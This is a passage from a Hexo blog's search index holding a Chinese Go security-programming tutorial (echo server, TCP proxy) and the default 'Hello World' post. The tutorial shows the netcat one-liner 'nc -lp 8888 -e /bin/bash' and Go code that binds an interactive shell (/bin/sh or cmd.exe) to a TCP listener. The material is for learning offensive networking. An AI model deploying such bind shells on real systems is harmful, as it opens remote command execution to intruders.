error&quot;</span>)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      log.Printf(<span class="string">&quot;recerved %d bytes :%s\n&quot;</span>, size, <span class="type">string</span>(b))\</span><br><span class="line">      <span class="comment">//conn.Write()发送数据</span></span><br><span class="line">      _, err = conn.Write(b[<span class="number">0</span>:size])</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalln(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   listener, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8888&quot;</span>)</span><br><span class="line">   log.Println(<span class="string">&quot;listning on 0.0.0.0:8888&quot;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      <span class="comment">//等待连接，在已建立连接创建net.conn</span></span><br><span class="line">      conn, _ := listener.Accept()</span><br><span class="line">      <span class="comment">//并发</span></span><br><span class="line">      <span class="keyword">go</span> echo(conn)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h5 id="改进：加入带缓冲的监听器"><a href="#改进：加入带缓冲的监听器" class="headerlink" title="改进：加入带缓冲的监听器"></a>改进：加入带缓冲的监听器</h5><ul><li>依赖相当低级的函数调用、缓冲区跟踪以及重复的R&#x2F;W。</li><li>运行过程很乏味且容易出错</li><li>使用bufio包包装了Reader和Writer，并且有I&#x2F;O缓冲机制</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">   <span class="keyword">defer</span> conn.Close()</span><br><span class="line">   reader := bufio.NewReader(conn)</span><br><span class="line">   s, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   log.Printf(<span class="string">&quot;read %d bytes: %s\n&quot;</span>, <span class="built_in">len</span>(<span class="type">string</span>(s), s))</span><br><span class="line"></span><br><span class="line">   writer := bufio.NewWriter(conn)</span><br><span class="line">   <span class="keyword">if</span> _, err := writer.WriteString(s); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(<span class="string">&quot;Unable to write data&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   writer.Flush() <span class="comment">//关闭写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用Copy-进一步简化"><a href="#使用Copy-进一步简化" class="headerlink" title="使用Copy()进一步简化"></a>使用Copy()进一步简化</h5><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119142006472.png" alt="image-20230119142006472"></p><h3 id="代理一个tcp客户端"><a href="#代理一个tcp客户端" class="headerlink" title="代理一个tcp客户端"></a>代理一个tcp客户端</h3><ul><li>本地主机(公司内网)&lt;-&gt;个人服务器(joesproxy.com)&lt;-&gt;目标站点(joescatcam.website)</li><li><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119214430613.png" alt="image-20230119214430613"></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(src net.Conn)</span></span> &#123;</span><br><span class="line">   dst, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;joescatcam.website:80&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(<span class="string">&quot;Unable to connnerct to our unreachable host&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> dst.Close()</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 在goroutine中运行以防止io.Copy被阻塞</span></span><br><span class="line">   <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      <span class="comment">//将源的输出复制到目标 dst = src</span></span><br><span class="line">      <span class="keyword">if</span> _, err := io.Copy(dst, src); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalln(err)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;()</span><br><span class="line">   <span class="comment">//将目标的输出复制回源 src = dst</span></span><br><span class="line">   <span class="keyword">if</span> _, err := io.Copy(src, dst); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   listener, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:80&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      conn, _ := listener.Accept()</span><br><span class="line">      <span class="keyword">go</span> handle(conn)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119214317336.png" alt="image-20230119214317336"></p><h3 id="复现Netcat命令执行"><a href="#复现Netcat命令执行" class="headerlink" title="复现Netcat命令执行"></a>复现Netcat命令执行</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">8888</span> -e /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Flusher包装bufio.Writer，显式刷新所有写入</span></span><br><span class="line"><span class="keyword">type</span> Flusher <span class="keyword">struct</span> &#123;</span><br><span class="line">   w *bufio.Writer</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//NewFlusher从io.Writer创建一个新的Flusher</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewFlusher</span><span class="params">(w io.Writer)</span></span> *Flusher &#123;</span><br><span class="line">   <span class="keyword">return</span> &amp;Flusher&#123;w: bufio.NewWriter(w)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foo *Flusher)</span></span> Write(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   count, err := foo.w.Write(b)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := foo.w.Flush(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> count, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">   <span class="comment">//显示调用/bin/sh并使用-i进入交互模式</span></span><br><span class="line">   <span class="comment">//这样就可以把它作为标准输入和标准输出</span></span><br><span class="line">   <span class="comment">//对于Windows：exec.Command(&quot;cmd.exe&quot;)</span></span><br><span class="line">   cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//将标准输入设置为我们的连接</span></span><br><span class="line">   cmd.Stdin = conn</span><br><span class="line">   <span class="comment">//从连接创建一个Flusher用于标准输出</span></span><br><span class="line">   <span class="comment">//这样可以确保标准输出被充分刷新并通过met.Conn发送</span></span><br><span class="line">   cmd.Stdout = NewFlusher(conn)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//运行命令</span></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>上面的解决方案虽然可行，但不够优雅。</li><li>学习io.Pipe()函数，该函数时Go的同步内存管道。可用于连接Reader和Writer</li><li>func Pipe() (*PipeReader, *PipeWriter)</li><li>将PipeReader链接到TCP连接。可使<br>用goroutine防止代码被阻塞。命令的任何标准输出都将发送到writer，然后通过管道传<br>送到reader并通过TCP连接输出</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    cmd := exex.Command(<span class="string">&quot;cmd.exe&quot;</span>)<span class="comment">//&quot;/bin/sh&quot;, &quot;-i&quot;</span></span><br><span class="line">    <span class="comment">//将标准输入设置为我们的连接</span></span><br><span class="line">    rp, wp := io.Pipe()</span><br><span class="line">    cmd.Stdin = conn</span><br><span class="line">    cmd.Stdout = wp</span><br><span class="line">    <span class="keyword">go</span> io.Copy(conn, rp)</span><br><span class="line">    cmd.Run()</span><br><span class="line">    conn.Close()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle(conn)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/02/01/%E5%85%B6%E4%BB%96/hello-world/"/>
      <url>/2023/02/01/%E5%85%B6%E4%BB%96/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
